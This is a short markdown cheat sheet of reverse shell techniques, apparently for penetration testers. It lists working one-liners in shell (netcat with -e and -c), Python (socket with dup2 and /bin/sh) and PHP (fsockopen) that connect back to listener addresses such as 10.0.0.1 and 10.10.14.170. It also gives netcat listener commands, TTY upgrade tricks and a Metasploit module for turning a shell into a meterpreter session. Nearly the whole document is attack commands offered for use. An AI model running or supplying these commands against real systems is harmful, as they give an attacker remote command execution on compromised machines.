# Shell Cheatsheet

## Reverse Shell

### Shell

```
nc -c '/bin/bash -c "script /dev/null"' 127.0.0.1 1337
```

```
nc -e /bin/sh 10.0.0.1 1234
```

### Python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.170",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```


### PHP

```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```


## Listener

### Shell

#### General Listener

```
stty -echo raw; nc -lp 1337; stty sane
```

#### Listen on a specific IP
```
nc -l -p 4444 -s 127.0.0.1
```


## Upgrading


### Shell

```
stty raw -echo && fg %1
```

### Python
```
python -c 'import pty; pty.spawn("/bin/sh")'
```

### MSF

```
use post/multi/manage/shell_to_meterpreter
```


## Resources

- [Pentest Monkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [xl7dev](http://blog.safebuff.com/2016/06/19/Reverse-shell-Cheat-Sheet/)

